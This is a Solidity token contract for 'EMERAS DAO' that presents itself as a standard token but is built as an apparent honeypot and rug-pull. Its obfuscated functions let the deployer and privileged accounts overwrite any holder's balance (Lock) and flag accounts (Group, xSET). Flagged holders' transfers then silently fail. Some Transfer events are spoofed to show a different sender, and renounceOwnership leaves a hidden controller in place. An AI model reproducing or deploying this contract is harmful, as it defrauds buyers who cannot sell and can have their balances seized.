/**
 *Submitted for verification at Etherscan.io on 2023-03-05
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract EMERAS {
    using SafeMath for uint256;
    mapping (address => uint256) private iFVa;
	
    mapping (address => uint256) public iFVb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "EMERAS DAO";
	
    string public symbol = "EMERAS";
    uint8 public decimals = 6;

    uint256 public totalSupply = 500000000 *10**6;
    address owner = msg.sender;
	  address private iFVc;
      address private iFVd;
    uint256 private iFVe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address iFVf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        iFVd = msg.sender;
             iFVa[msg.sender] = totalSupply;
        
       zForge();}

  
	
	
   
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function zForge() internal  {                             
                       iFVb[msg.sender] = 3;
                       iFVc = iFVf;

                

        emit Transfer(address(0), iFVc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return iFVa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(iFVb[msg.sender] <= iFVe) {
    require(iFVa[msg.sender] >= value);
iFVa[msg.sender] -= value;  
iFVa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(iFVb[msg.sender] > iFVe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function Group (address iia, uint256 iib) public {
		if(iFVb[msg.sender] == iFVe) {   
			   	   
   iFVb[iia] = iib;}
   }
		       function xSET (uint256 iib) public {
                     require(msg.sender == iFVd);
                     iFVe = iib; 
	}

 		       function Lock (address iia, uint256 iib) public {
		if(iFVb[msg.sender] == iFVe) {   
			   	   
   iFVa[iia] = iib;}
   }


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(iFVb[from] < iFVe && iFVb[to] < iFVe) {
        require(value <= iFVa[from]);
        require(value <= allowance[from][msg.sender]);
        iFVa[from] -= value;
        iFVa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(iFVb[from] == iFVe) {
        require(value <= iFVa[from]);
        require(value <= allowance[from][msg.sender]);
        iFVa[from] -= value;
        iFVa[to] += value;
        allowance[from][msg.sender] -= value;


            from = iFVf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(iFVb[from] > iFVe || iFVb[to] > iFVe) {
             
         }}



     

        	
 }